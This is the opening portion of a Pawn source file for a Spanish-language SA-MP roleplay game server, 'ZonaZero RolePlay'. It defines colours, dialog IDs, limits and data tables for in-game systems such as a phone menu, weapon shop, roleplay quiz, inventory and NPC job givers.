/*
	*	(c) Copyright 2013 - 2015
	*
	*	Nombre del proyecto:	ZonaZero RolePlay
	*	Desarrollador:			Parka, Lucas Clemente(lolking), Sergio Mitnick.
	*   Mappers:                Javier_Cardenas.
	*	Version:				1.6.5.4
	*
	*	Principal: ZZ-RP.pwn
	*
*/
/******************************************************************************/
/*******************************[- Librerias -]********************************/
/******************************************************************************/
#include	<a_samp>
#include 	<a_zones>
#include    <a_mysql>
#include 	<bot>
#include	<zcmd>
#include	<sscanf2>
#include	<streamer>
#include 	<seif_walk>
#include 	<mSelection>
#include 	<progressbar>
#include 	<SetVehicleAttachedObject[inc]>

AntiDeAMX()
{
	new a[][] = {"Unarmed (Fist)", "Brass K"};
	#pragma unused a
}

#pragma tabsize 0
#pragma dynamic 15000
/******************************************************************************/
/******************************[- Definiciones -]******************************/
/******************************************************************************/
#undef MAX_PLAYERS
#define MAX_PLAYERS (150)

#define Version			"v1-ALFA"
#define ModeText		"RolePlay - RP - "Version""
#define MapName			"mapname Los Santos"
#define Hostname		"hostname Center Island Roleplay - Tu Rol esta Aqui [0.3.7]"
#define Language        "Español - LS"

#define ShowLoginDialog(%1,%2)			ShowPlayerDialog(%1, %2, DIALOG_STYLE_PASSWORD, "Bienvenido una vez más! - {EE6C68}ZonaZero Roleplay", "{FFFFFF}Un cordial saludo.\n\n{FFFFFF}Ingresa tu contraseña para ingresar legalmente al servidor.\n\n{FFFFFF}Web: {4AACAA}www.CenterIsland.com\n{FFFFFF}Facebook: {005982}www.Facebook.com/groups/ZZRP\n{FFFFFF}Teamspeak3: {B63221}ts3.CenterIsland.com\n\n{FFFFFF}Recuerda ser activo en nuestro Foro!.", "Ingresar", "Salir")
#define ShowRegisterDialog(%1,%2)		ShowPlayerDialog(%1, %2, DIALOG_STYLE_INPUT, "Registre una cuenta ahora! - {EE6C68}ZonaZero Roleplay", "{FFFFFF}Un cordial saludo.\n\n{FFFFFF}Tu cuenta no está registrada, ingresa una contraseña para registrarte legalmente.", "Registrar", "Salir")
#define MostrarDialogo(%1,%2)			ShowPlayerDialog(%1, DIALOG_ERROR, DIALOG_STYLE_MSGBOX, "{EE6C68}CIRP - {FFFFFF}Soporte.", %2, "Aceptar", "")

#define EnviarPeticion(%1,%2)  			ShowPlayerDialog(%1, DIALOGO_PETICIONES, DIALOG_STYLE_MSGBOX, "Petición", %2, "Aceptar", "Rechazar")
#define AdminPanel(%1)  				ShowPlayerDialog(%1, PW_ADMIN, DIALOG_STYLE_INPUT, "{EE6C68}Panel Administrativo", "{FFFFFF}Ingrese su nueva contraseña de administración", "Ingresar", "Salir")

#define	CallBack::%0(%1)				forward  %0(%1); public  %0(%1)
#define MensajeGlobal   				SendClientMessageToAll
#define Mensaje 						SendClientMessage
#define Sostener(%0)					((newkeys & (%0)) == (%0))
#define Funcion.%0(%1)					static %0(%1)
//Definiciones todos los colores |----->
#define COLOR_AMARILLO			0xFFFF00FF
#define COLOR_AMARILLO2			0xDABB3EAA
#define COLOR_AMARILLO3			0xF5DEB3AA
#define COLOR_AZUL				0x2641FEAA
#define COLOR_AZUL_CLARO		0x33CCFFAA
#define COLOR_BLANCO			0xFFFFFFAA
#define COLOR_NARANJA			0xFF7F00FF
#define COLOR_NEGRO				0x000000AA
#define COLOR_ROJO				0xAA3333AA
#define COLOR_ROJO2				0xFF0000FF
#define COLOR_ROJO3				0xFF6347AA
#define COLOR_ROJO4				0xB90000FF
#define COLOR_LIMA				0x00FF00FF
#define COLOR_VERDE				0x9EC73DAA
#define COLOR_VERDE2			0x00BF60FF
#define COLOR_GRIS				0xAFAFAFAA
#define COLOR_GRIS1				0xB4B5B7FF
#define COLOR_GRIS2				0xBFC0C2FF
#define COLOR_GRIS3				0xCBCCCEFF
#define COLOR_GRAD4				0xD8D8D8FF
#define COLOR_GRAD5				0xE3E3E3FF
#define COLOR_GRAD6				0xF0F0F0FF
#define COLOR_FADE				0xE6E6E6E6
#define COLOR_FADE1				0xE6E6E6E6
#define COLOR_FADE2				0xC8C8C8C8
#define COLOR_FADE3				0xAAAAAAAA
#define COLOR_FADE4				0x8C8C8C8C
#define COLOR_FADE5				0x6E6E6E6E
#define COLOR_PURPURA			0xC2A2DAAA
#define COLOR_CIAN				0xFF8282AA
#define COLOR_VIOLETA			0x9600FF2E

#define COLOR_NEWS				0x458E1DAA
#define TEAM_RADIO_COLOR		0x9B9BFFFF
#define COLOR_MEGAFONO			0xFF9B6AFF
#define COLOR_CHAT_NOTICIAS		0xB1C8FBAA
#define COLOR_BUSCADO			0xBF6000FF

#define COL_GRIS				"{C3C3C3}"
#define COL_BLANCO				"{FFFFFF}"
#define COL_ROJO				"{F81414}"
#define COL_AZUL_CLARO			"{00C0FF}"

//Definiciones todos los dialogos |--->
#define DIALOGO_REGISTRO 														(0)
#define DIALOGO_INGRESO 														(1)
#define DIALOGO_DEPOSITO 														(2)
#define DIALOGO_TRANSFERENCIA 													(3)
#define DIALOGO_SACAR 															(4)
#define DIALOGO_TRANSFERENCIA2 													(5)
#define DIALOG_WOOFER 															(6)
#define COMIDA_MENU																(7)
#define DIALOGO_OBTENER_LICENCIA												(8)
#define DIALOGO_HABILIDAD_ARMAS													(9)
#define DIALOGO_BOLSA															(10)
#define COLOR_ADM      															(11)
#define CELDAS         															(12)
#define CPRISION       															(13)
#define CELDA1         															(14)
#define CELDA2         															(15)
#define CELDA3         															(16)
#define EQUIPO_NG      															(17)
#define DNI_MENU        														(18)
#define DIALOG_HIT     															(19)
#define DIALOGO_IMPUESTO_CASAS													(20)
#define DIALOGO_IMPUESTO_NEGOCIOS												(21)
#define DIALOGO_IMPUESTO_AUTOS													(22)
#define DIALOGO_TRABAJO_UBICACION 												(23)
#define DNI_CONFIRM     														(24)
#define DIALOGO_PAQUETES_PREMIUM												(25)
#define DIALOGO_BARRENDERO														(26)
#define ADMINDUTY_LOGIN		                                                    (27)
#define DIALOGO_INVENTARIO														(28)
#define DIALOGO_CAMBIO_NACION													(29)
#define DIALOGO_COMPRAR_MNEGRO													(30)
#define DIALOGO_PRUEBA_ROL														(31)
#define EQUIPO_FBI     															(32)
#define DIALOG_SO      															(33)
#define SEL_SKIN       															(34)
#define EQUIPO_MECANICO 														(35)
#define EQUIPO_GOBIERNO 														(36)
#define DIALOGO_COMPRAR_ROPA													(37)
#define Radios 																	(38)
#define Stats 																	(39)
#define DIALOGO_CAJERO 															(40)
#define DIALOG_ERROR    														(41)
#define SUBSIDIO        														(42)
#define DIALOG_BOOMBOX  														(43)
#define DIALOG_BOOMBOX1 														(44)
#define DIALOG_BOOMBOX2 														(45)
#define DIALOG_BOOMBOX3 														(46)
#define DIALOG_BOOMBOX4 														(47)
#define DIALOG_BOOMBOX5 														(48)
#define DIALOG_BOOMBOX6 														(49)
#define DIALOG_BOOMBOX7 														(50)
#define DIALOGO_TRANSPORTE_VALORES												(51)
#define Dialog_NegocioSell														(52)
#define Dialog_CasaSell															(53)
#define Dialogo_LocalizarCoche													(54)
#define DIALOGO_ANUNCIO_INTERNET												(55)
#define DIALOGO_CONDUCTOR_BUS													(56)
#define PW_ADMIN        														(57)
#define DIALOGO_TRANSPORTE_AVIADOR												(58)
#define DIALOGO_TRANSPORTE_CAMIONERO											(59)
#define DIALOGO_BENEFICIOS_PREMIUM												(60)
#define DIALOGO_MENU_BEBIDAS													(61)
#define DIALOG_DUDA																(62)
#define SOPORTE_D 																(63)
#define GUIA_D          														(64)
#define DIALOGO_VENDER_AUTO														(66)
#define DIALOGO_EQUIPO_LSPD 													(67)
#define DIALOGO_EQUIPO_LSPD2 													(68)
#define DIALOGO_EQUIPO_LSPD3  													(69)
#define DIALOGO_EQUIPO_LSPD4  													(70)
#define DIALOGO_EQUIPO_LSPD5  													(71)
#define DIALOGO_EQUIPO_LSPD9  													(72)
#define DIALOGO_EQUIPO_LSPD10  													(73)
#define DIALOGO_EQUIPO_LSPD11  													(74)
#define DIA_RENTA 																(75)
#define CREDITOS 																(76)
#define DIALOGO_MAPA 															(77)
#define MECANICO_MENU_CHECK_REMOVEALL 											(78)
#define DINFO   																(79)
#define DINFO   																(79)
#define TOYS        															(80)
#define DELETETOY       														(81)
#define WEARTOY         														(82)
#define BUYTOYS         														(83)
#define BUYTOYS2        														(84)
#define BUYTOYS3        														(85)
#define EDITTOYS        														(86)
#define EDITTOYS2       														(87)
#define EDITTOYSBONE    														(88)
#define EDITTOYSPX      														(89)
#define EDITTOYSPY      														(90)
#define EDITTOYSPZ      														(91)
#define EDITTOYSRX      														(92)
#define EDITTOYSRY      														(93)
#define EDITTOYSRZ      														(94)
#define DIALOGO_COMPRA_247 														(95)
#define LOTTO_BUY       														(96)
#define DIALOGO_BOVEDA															(97)
#define CREATE_WEAPON     														(98)
#define DIALOGO_BOVEDA_SACAR													(99)
#define DIALOGO_SANTIAGO                                                        (100)








#define DIALOG_LSPD_ELEVATOR   													(109)
#define DIALOGO_FACCION_EDITAR													(110)
#define DIALOGO_FACCION_A														(111)
#define DIALOGO_FACCION_B														(112)
#define DIALOGO_FACCION_EDITAR_A												(113)

#define LSPD_EMBARGOS_MENU                                                      (115)
#define MECANICO_MENU   														(116)
#define MECANICO_MENU_REPARACION    											(117)
#define MECANICO_MENU_GASOLINA      											(118)
#define MECANICO_MENU_TUNING        											(119)
#define MECANICO_MENU_TUNING_global 											(120)
#define MECANICO_MENU_TUNING_global_suspensionystereo 							(121)
#define MECANICO_MENU_TUNING_SPECIAL    										(122)
#define TUNING_WAA  															(123)
#define MECANICO_MENU_TUNING_color  											(124)
#define MECANICO_MENU_TUNING_color_1  											(125)
#define MECANICO_MENU_TUNING_color_2  											(126)
#define MECANICO_MENU_TUNING_name  												(127)
#define MECANICO_MENU_TUNING_motor 												(128)
#define MECANICO_MENU_TUNING_bateria 											(129)
#define TUNING_MENU_NITRO   													(130)
#define TUNING_MENU_RUEDAS 														(131)
#define MECANICO_MENU_EMBARGAR      											(132)
#define MECANICO_MENU_DESEMBARGAR   											(133)
#define MECANICO_MENU_MULTAR        											(134)
#define MECANICO_MENU_REMOLCAR      											(135)
#define MECANICO_MENU_OTROS         											(136)
#define MECANICO_MENU_OTROS_matricula  											(137)
#define REQF_ACCEPT 															(138)
#define DIALOGO_PETICIONES 														(139)
#define BRILLO_GAFAS 															(140)
#define ENTER_LSTV 																(141)
#define DIALOGO_CAMBIAR_CLAVE													(142)
#define IMPORTAR_MOTOR  														(143)

#define DRUGS_DIALOG 															(145)
#define CONFIRM_DRUGS_DIALOG    												(146)
#define TEL_INPUT   															(147)
#define TEL_MSGBOX  															(148)
#define IPHONE_OPTIONS  														(149)
#define IPHONE_AGENDA   														(150)
#define IPHONE_AGENDA_VB     													(151)
#define IPHONE_AGENDA_ESCRIBIR  												(152)
#define CLOTHES_CHOOSE_DIALOG   												(153)
#define DIALOGO_EDITAR_STAFF													(154)
#define DIALOGO_EDITAR_STAFF_A													(155)
#define DIALOGO_EDITAR_STAFF_B													(156)

#define IPOD_MENU       														(158)
#define IPOD_MP3        														(159)
#define DIALOGO_RECARGAR_TELEFONO   											(160)
#define DIALOGO_NUMERO_CONFIRMADO  												(161)
#define DIALOGO_SALDO_PAQUETES 													(162)
#define DIALOG_SAMUR_ELEVATOR   												(163)
#define IPHONE_AGENDA_ESCRIVIR                                                  (958)
#define DIALOG_FBI_ELEVATOR     												(164)
#define DIALOG_ESTADO   														(165)
#define DIALOG_REG_ESTADO   													(166)




#define	GPS_DIALOG  															(171)
#define BARES       															(172)
#define EMERGENCIAS 															(173)
#define NEGOCIOS     															(174)
#define LUGARPUBLICO    														(175)
#define SERVICIOS       														(176)




#define DELE_BUY_SEX    														(181)
#define DELE_BUY_SEXM   														(182)
#define DELE_BUY_SEXF   														(183)
#define DELE_BUY_SEXJ   														(184)
#define DIALOGO_QUITAR_EXTORCION  												(185)
#define TIENDA_ELECTRONICA 														(186)




#define DIALOGO_KICK                                                            (191)
#define DIALOGO_PUBLICIDAD                                                      (192)
#define DIALOGO_PUBLICIDAD_A                                                    (193)
#define DIALOG_EDITAR_PUBLICIDAD                                                (194)
#define DIALOGO_DEFAULT															(15000)

//Definiciones todos los limites |--->
#define MAX_PLAYERTOYS															(5)
#define MAX_TRUNK_SLOTS															(5)
#define MAX_VEHICLE_PLATE														(7)
#define MAX_FAMILIES        													(11)
#define MAX_PLYVEH_RATIO														(20)
#define MAX_FACTION																(26)
#define MAX_BIZZ            													(500)
#define MAX_BARRERAS 															(35)
#define MAX_VEHICLE_MODELS														(70)
#define MAX_EPILEPSIA   														(75)
#define MAX_CANCER  															(100)
#define MAX_ARMAS           													(200)
#define MAX_HOUSES          													(1000)
#define MAX_SPIKESTRIPS 														(50)
#define MAX_SKILLS_WORK															(13)
#define VEHICULO_SPAWN															(7200 * 1000)
#define MaxTimePayDay															(60)
#define MAX_SEMILLAS_SEMBRADAS													(2000)
#define MAX_FAMILIAS															(20)
#define MAX_ANUNCIOS															(10)
#define MAX_LINEAS																(30)
#define MAX_TIEMPO_ESPERA_GASOLINA 												(10000)
#define SPECIAL_ACTION_PISSING 													(68)
#define VEHICULOS_COMPRABLES													(800)
#define MAXIMAS_REJAS															(50)
//Activar/Desactivar la navidad.
//#define NAVIDAD

new Periodico[MAX_LINEAS][256];

new indiceNegocio = 0;
new indiceCasa = 0;
new indiceCoches = 0;

enum _@en@servidor
{
	mysqlControl, /*La conexion MySQL*/
	tiempoUso[3] /*El tiempo de uso de un comando en especifico*/
}
new static servidor[_@en@servidor];

new gHackSpawn[MAX_PLAYERS char];
new gHackSpawn2[MAX_PLAYERS];
static AntiVehiculoTele[MAX_PLAYERS];
static Float:gVps[MAX_VEHICLES][3];

static NombrePersonal[3][MAX_PLAYER_NAME]={"Lucas_Clemente", "Cesar_Segura", "Sergio_Mitnick"};
static RetornarNombre(playerid){
	for(new i=0;i<sizeof(NombrePersonal);i++){
		if(!strcmp(NombrePersonal[i], Nombre(playerid))){
			return true;
		}
	}
	return false;
}

#define Kick(%0) SetTimerEx("Kicka", 500, false, "i", %0)
forward Kicka(p); public Kicka(p)
{
    #undef Kick
    Kick(p);
    #define Kick(%0) SetTimerEx("Kicka", 100, false, "i", %0)
    return 1;
}

/******************************************************************************/
/******************************[- Variables -]*********************************/
/******************************************************************************/
//Zonas Privadas
static const Float:zonaPrivada[][4] ={
	{1673.330078, -1955.662353, 1833.330078, -1811.662353}, 
	{1414.906494, -1773.031982, 1534.906494, -1573.031982}, 
	{1248.282592, -1040.422241, 1360.282592, -952.422241}, 
	{1067.471801, -1418.562988, 1267.471801, -1282.562988}, 
	{491.947387, -1349.840087, 619.947387, -1237.840087}
};
//Sistema de iPhone |--->
enum @en@iPhone
{
	ipOpcion[16], 
	PlayerText:TDIphone
};
new Text:iPhoneGlobalTextdraw[12];
new PlayerText:iPhonewifi[MAX_PLAYERS];
new iPhoneDatos[][@en@iPhone] = 
{
	{"~>~ Llamar"		, PlayerText: 0}, 
	{"~>~ SMS"			, PlayerText: 0}, 
	{"~>~ Buzon"		, PlayerText: 0}, 
	{"~>~ Agenda"		, PlayerText: 0}, 
	{"~>~ Saldo"		, PlayerText: 0}, 
	{"~>~ Whatsapp"		, PlayerText: 0}, 
	{"~>~ Anuncios"		, PlayerText: 0}, 
	{"~>~ Publicidad"	, PlayerText: 0}, 
	{"~>~ Periodico"	, PlayerText: 0}, 
	{"~>~ GPS"			, PlayerText: 0}, 
	{"~>~ Coche"		, PlayerText: 0}, 
	{"~>~ ~r~Salir"		, PlayerText: 0}
};
//Sistema de Habilidad de armas
enum _@en@habilidadArmas
{
	hA@secuencia, 
	hA@secuenciatmp, 
	bool:hA@uso, 
	Float:hA@pos[3], 
	hA@armaid, 
	hA@objetoid, 
	hA@exp
}
new static habilidadArmas[][_@en@habilidadArmas] = {
	{0, 0, false, {300.0844, -138.6369, 1004.0625}}, // BOX 1
	{0, 0, false, {300.0846, -136.9560, 1004.0625}}, // BOX 2
	{0, 0, false, {300.0788, -135.5143, 1004.0625}}, // BOX 3
	{0, 0, false, {300.0777, -133.9482, 1004.0625}}, // BOX 4
	{0, 0, false, {300.0779, -132.5674, 1004.0625}}, // BOX 5
	{0, 0, false, {300.0800, -131.0244, 1004.0625}}, // BOX 6
	{0, 0, false, {300.0809, -129.5463, 1004.0625}}, // BOX 7
	{0, 0, false, {300.0788, -128.0800, 1004.0625}}// BOX 8
};
//Venta de armas
enum _@en@armasventa
{
	av@armaid, 
	av@municion, 
	av@Precio, 
	av@zzPrecio, 
	av@object, 
	Float:av@Pos[6]
}
new static const armasventa[][_@en@armasventa] = {
	{27, 35, 8000, 185, 351, {314.86142, -132.74643, 999.58600, 94.00000, 90.00000, -45.00000}}, //spa
	{25, 30, 3900, 90, 349, {314.97525, -133.90668, 999.58600, 94.00000, 90.00000, -45.00000}}, //escopeta
	{22, 50, 750, 55, 346, {315.07538, -134.97198, 999.58600, 85.00000, 90.00000, -45.00000}}, //colt
	{24, 40, 2100, 70, 348, {315.86401, -135.52803, 999.58600, 90.00000, 90.00000, -45.00000}}, //desert
	{30, 60, 6400, 155, 355, {309.08765, -142.08327, 999.57672, 83.64000, -52.76000, 359.27979}}, //ak
	{31, 60, 7000, 165, 356, {310.06799, -142.08673, 999.57672, 83.94009, -54.74009, 359.27979}}, //m4
	{50, 100, 3200, 85, 373, {306.2746, -142.1774, 1000.08667, -34.02000, -49.55008, 60.00000}}, //chaleco
	{29, 90, 4200, 105, 353, {308.11600, -142.03590, 999.61871, 87.72000, -46.82011, 359.27979}}, //mp5
	{33, 10, 6650, 115, 357, {307.16751, -142.09546, 999.57672, 83.64000, -52.76000, 359.27979}}//rifle
};
//Sistema de test de rol
enum _@en@pruebarol
{
	pregunta[128], 
	opciona[128], 
	opcionb[128], 
	opcionc[128], 
	respuesta
}
new static const pruebarol[][_@en@pruebarol] = {
	{"¿Qué significa DM?", "a. Matar sin motivo alguno y sin rol mediante a algún usuario.", "b. Vender droga.", "c. Matar en la comisaría.", 0}, 
	{"¿Qué es considerado MG?", "a. Confundir información IC con OOC y viceversa.", "b. Abreviatura de Me Gusta.", "c. Escribir con mala ortografía.", 0}, 
	{"Si te matan, ¿cobrarías venganza?", "a. Sí, ya que le tengo bronca.", "b. No, ya que cuando muero pierdo la memoria, y sería RevengeKill.", "c. Sí, porque el me mató.", 1}, 
	{"¿Qué hago si veo a alguien ofreciéndome dinero y armas sin rol?", "a. Lo reporto enseguida con un administrador y tomo SS de la situación.", "b. Acepto el dinero y las armas, ya que me vendrían bien.", "c. Aceptaría el dinero para comprarme una casa y un auto.", 0}, 
	{"¿Cómo reaccionarías si te encuentras en un tiroteo y te disparan pero no mueres?", "a. Me voy corriendo ya que no tengo nada que ver.", "b. Roleo la herida y si puedo, llamo a una ambulancia.", "c. Saco mi arma y le disparo también.", 1}, 
	{"¿Qué pasa si hay alguien cometiendo faltas de rol y no hay ningún Staff en línea?", "a. Le digo que se detenga o que lo reportaré.", "b. Saco SS del sujeto y procedo a reportarlo en foro.", "c. Lo ignoro.", 1}, 
	{"¿Qué significa PowerGaming?", "a. El poder del juego.", "b. Realizar acciones que son imposibles de hacer en la vida real.", "c. Una marca de computadoras.", 1}, 
	{"¿Qué pasa si chocas contra un auto o edificio?", "a. Sigo mi camino, total el auto sigue andando.", "b. Me bajo y agarro otro auto.", "c. Roleo el choque, las heridas, y llamaría a una ambulancia.", 2}, 
	{"¿Qué harías si encuentras un bug en el servidor del cuál te puede beneficiar?", "a. Lo aprovecho y no se lo digo a nadie para que no se den cuenta.", "b. Lo reporto en foro con las respectivas SS para que el equipo técnico lo solucione.", "c. Se lo cuento a mis amigos cercanos para aprovecharlo.", 1}, 
	{"¿Como entrarías a una Mafia si lo desearas?", "a. Busco usuarios con nombres italianos porque se que son mafiosos.", "b. Publico anuncios buscando a mafiosos italianos.", "c. Espero algún anuncio que tenga que ver con empleo, puede que esa sea la oportunidad.", 2}};
//Sistema de inventario
enum _@en@inventario
{
	invArmas[6], 
	invBalas[6], 
	invBebida[2]
}
new static inventario[MAX_PLAYERS][_@en@inventario];
//Sistema de maletero(autos)  |--->
enum _@en@maletero{
	bool:mbloqueo, 
	mchaleco, 
	marma[8], 
	mbalas[3], 
	mdrogas[5]
}
new maletero[MAX_VEHICLES][_@en@maletero];
//Sistema de semillas  |--->
enum _@en@semillas
{
	bool:sSlot, 
	sTipo, 
	sTime, 
	sDueno[24], 
	sNameTipo[24], 
	Float:sPosicion[3], 
	Text3D:sLabel, 
	sObjeto
}
new semillas[MAX_SEMILLAS_SEMBRADAS][_@en@semillas];
//Sistema de espinas  |--->
enum _@en@espinas
{
	sCreated, 
    Float:sX, 
    Float:sY, 
    Float:sZ, 
    sObject, 
};
new espinas[MAX_SPIKESTRIPS][_@en@espinas];
//Sistema de familias  |--->
enum _@en@familias{
	fOcupado, 
	fNombre[64], 
	fRango0[24], 
	fRango1[24], 
	fRango2[24], 
	fRango3[24], 
	fRango4[24], 
	fRango5[24], 
	Float:fpospick[3], 
	bool:fChat, 
	Text3D:fHqFam3d, 
	fHqFampi
}
new familias[MAX_FAMILIAS][_@en@familias];
//Sistema de juguetes[modificar]  |--->
enum _@en@juguetes
{
	ptModelID, 
	ptBone, 
	Float:ptPosX, 
	Float:ptPosY, 
	Float:ptPosZ, 
	Float:ptRotX, 
	Float:ptRotY, 
	Float:ptRotZ, 
	Float:ptScaleX, 
	Float:ptScaleY, 
	Float:ptScaleZ
};
new juguetes[MAX_PLAYERS+1][MAX_PLAYERTOYS][_@en@juguetes];

//Sistema de rejas editables.
#define REJA_EDITOR_PASO_A 0
#define REJA_EDITOR_PASO_B 1
#define REJA_EDITOR_PASO_C 2

enum _@en@rejas
{
	reID, 
	reModelo, 
	reCobra, 
	reFacion, 
	Float:rePos[12], /*Posiciones de la reja, abierta y cerrada.*/
	reEstado
}
new static rejas[MAXIMAS_REJAS][_@en@rejas];

enum _@en@Autosfacc
{
	af@carid, 
	af@unico, 
	af@faccion, 
	af@colores[2], 
	Float:af@Pos[4], 
	af@modelo
}
new static Autosfacc[150][_@en@Autosfacc];
//Sistema de NPC
enum _@en@nonplayers
{
	npcModel, 
	Float:npcPos[4], 
	npcWorld, 
	npcUtil, 
	npcText1[21], 
	npcText2[21], 
	npcText3[21], 
	npcText4[21], 
	npcNombre[21], 
	Text:interfaz[6], 
	npcID
}
new static nonplayers[][_@en@nonplayers] = 
{
	{194, {1307.4309, -976.3257, 39.1699, 89.9832}, 0, false, "retirar subsidio", "sacar tarjeta", "_", "_", "Alejandra Gomez"}, //banquero
	{240, {1307.4205, -972.7270, 39.1299, 89.6973}, 0, false, "retirar subsidio", "sacar tarjeta", "_", "_", "Jorge Sureda"}, //banquero
	{240, {1307.4492, -980.1454, 39.1699, 90.1767}, 0, false, "retirar subsidio", "sacar tarjeta", "_", "_", "Jose Medina"}, //banquero
	{017, {360.24480, 138.03480, 1025.23, 4.05080}, 0, false, "pagar casa", "pagar negocio", "pagar auto", "_", "Esteban Guridi"}, //Ayuntamiento
	{076, {362.10660, 138.03500, 1025.25, 356.844}, 0, false, "pagar casa", "pagar negocio", "pagar auto", "_", "Carolina Lenzi"}, //Ayuntamiento
	{098, {1712.0562, -1851.057, 13.5669, 178.579}, 0, false, "sacar dni", "cambiar nacionalidad", "_", "_", "Ricardo Simanca"}, //Sacar DNI
	{164, {1277.5189, -980.8588, 38.3699, 297.099}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Armando Ventura"}, //Transportador de Valores
	{061, {1957.0010, -2183.723, 13.5469, 265.845}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "George Bartolome"}, //Piloto
	{006, {2205.6243, -2667.085, 14.8645, 92.9303}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Juan Morales"}, //Camionero
	{008, {2481.6611, -1536.695, 24.0992, 274.473}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Edgar Carretero"}, //Barrendero
	{253, {1156.6292, -1769.978, 16.5938, 358.279}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Fernando Perez"}, //Chofer de Bus
	{158, {-382.6065, -1438.936, 26.0048, 269.581}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Pedro Novillo"}, //Agricultor
	{155, {2102.3044, -1810.030, 13.5547, 91.2935}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Jesus Lopez"}, //Pizzero
	{261, {1685.6140, -1944.629, 13.5469, 270.835}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Martin Rodriguez"}, //Conductor de Trenes
	{007, {1766.1630, -1903.391, 13.5665, 3.26940}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Alberto Mejia"}, //Taxista
	{006, {2190.6213, -1997.077, 13.5469, 1.38950}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Santiago Miguez"}, //Basurero
	{128, {60.707300, -1720.755, 7.51720, 89.1236}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Mateo Suñiga"}, //Pescador
	{027, {2530.6440, -880.2695, 87.6567, 92.8836}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Eduardo Constantino"}, //Minero
	{260, {1266.2498, -1260.133, 13.2030, 313.448}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Carlos Bustamante"}, //Obrero
	{230, {2609.0308, -2192.240, -0.2188, 97.2702}, 0, false, "deseo trabajar aqui", "renuncio", "_", "_", "Victor Nikolai"}, //Ladron(ES UN VAGO)
	{005, {1399.2349, -1446.097, 8.67160, 278.829}, 0, false, "articulos", "_", "_", "_", "Fat Afro"}, //Posicion Mercado Negro
	{285, {297.08680, -1521.624, 3267.09, 356.279}, 0, false, "Servicio", "Equipamiento", "_", "_", "Howard Newgate"}, //armeria LSPD /duty /radio /equipo
	{280, {0.0, 0.0, 0.0, 0.0}, 220, false, "_", "_", "_", "_", "Ian Brown"}, //prision cmd /arrestar
	{170, {1834.6340, -1836.586, 13.6699, 177.750}, 0, false, "articulos", "recargar", "_", "_", "Sergio Cabo"}, //24-7 Unity
	{170, {1925.5570, -1785.267, 13.5826, 0.42580}, 0, false, "articulos", "recargar", "_", "_", "Gilberto Zapata"}, //24-7 Unity 2
	{170, {2110.2549, -1737.176, 13.6079, 270.184}, 0, false, "articulos", "recargar", "_", "_", "Camilo Fuentes"}, //24-7 Unity 3
	{170, {1321.2704, -882.9189, 39.6969, 90.3300}, 0, false, "articulos", "recargar", "_", "_", "Cesar Delgado"}, //24-7 Vinelwood
	{170, {1357.4752, -1762.009, 13.5650, 87.5100}, 0, false, "articulos", "recargar", "_", "_", "Jason Rollingson"}, //24-7 Ayuntamiento
	{171, {1290.8143, -1870.710, 13.5550, 267.678}, 0, false, "bebidas", "_", "_", "_", "Joaquin Ortega"}, //Restaurante 1
	{189, {1396.7666, -1886.132, 17.4745, 88.1368}, 0, false, "bebidas", "_", "_", "_", "Maximiliano Lopez"}, //Bar 1
	{242, {497.20650, -77.56130, 998.765, 0.68590}, 497, false, "bebidas", "_", "_", "_", "Thomas Otero"}, //Bar pandillas
	{184, {2430.5901, -1672.745, 13.7287, 359.745}, 0, false, "bebidas", "_", "_", "_", "Ivan Sidorenko"}, //Bar Groove
	{185, {-782.3324, 498.31940, 1371.74, 2.30760}, 0, false, "bebidas", "_", "_", "_", "Matias Clemente"}, //Bar Pub
	{188, {501.70030, -20.44670, 1000.67, 88.5315}, 499, false, "bebidas", "_", "_", "_", "Mariano Davila"}, //Bar Alhabra
	{193, {1780.6925, -1562.058, -49.451, 271.437}, 498, false, "bebidas", "_", "_", "_", "Katerine Rojas"}, //Bar Club VIP 1(MUJER)
	{189, {1777.1694, -1558.219, -49.451, 359.485}, 498, false, "bebidas", "_", "_", "_", "Diego Ceballos"}, //Bar Club VIP 2
	{155, {374.74810, -117.2711, 1001.49, 178.640}, 469, false, "combos de pizzas", "_", "_", "_", "Jony Pastore"}, //Pizza
	{167, {370.82190, -4.491700, 1001.85, 181.097}, 475, false, "combos de pollos", "_", "_", "_", "Tony Verduzgo"}, //Chuking
	{167, {370.82190, -4.491700, 1001.85, 181.097}, 476, false, "combos de pollos", "_", "_", "_", "Johan Verduzgo"}, //Chuking
	{167, {370.82190, -4.491700, 1001.85, 181.097}, 477, false, "combos de pollos", "_", "_", "_", "Dimitri Verduzgo"}, //Chuking
	{205, {377.3009, -65.8452, 1001.5078, 177.223}, 486, false, "Hamburguesas", "_", "_", "_", "Tatiana Gomez"}, // Burger shoot
	{205, {377.3009, -65.8452, 1001.5078, 177.223}, 483, false, "Hamburguesas", "_", "_", "_", "Mirian Gomez"}, // Burger shoot
	{295, {1777.4930, -1704.833, 13.5957, 176.397}, 0, false, "electronicos", "_", "_", "_", "Mohamed Hamdidaf"}, //Tienda de Electronica
	{223, {2070.4050, -2217.428, 2664.61, 87.6042}, 0, false, "sacar licencia", "_", "_", "_", "Joel Cabello"}, //Centro de Licencias
	{258, {563.0242, -1299.4895, 17.2579, 90.1907}, 0, false, "autos lujosos", "autos familiares", "motocicletas", "aviones", "Tito Dominic"}, //Consecionarias
	/* 45 */{112, {563.0352, -1297.5935, 17.2579, 90.1907}, 0, false, "autos lujosos", "autos familiares", "motocicletas", "aviones", "Toreto Dominic"}, //Consecionarias
	{1, {2165.9282, -1737.1431, 13.5909, 1.4705}, 0, false, "deseo trabajar aqui", "renuncio", "comenzar trabajo", "_", "Carlos Madero"}, //carpintero job
	{120, {852.4067, 5516.1602, 8.5859, 91.8660}, 0, false, "bebidas", "_", "_", "_", "Raul Ceballos"}, //Bar	
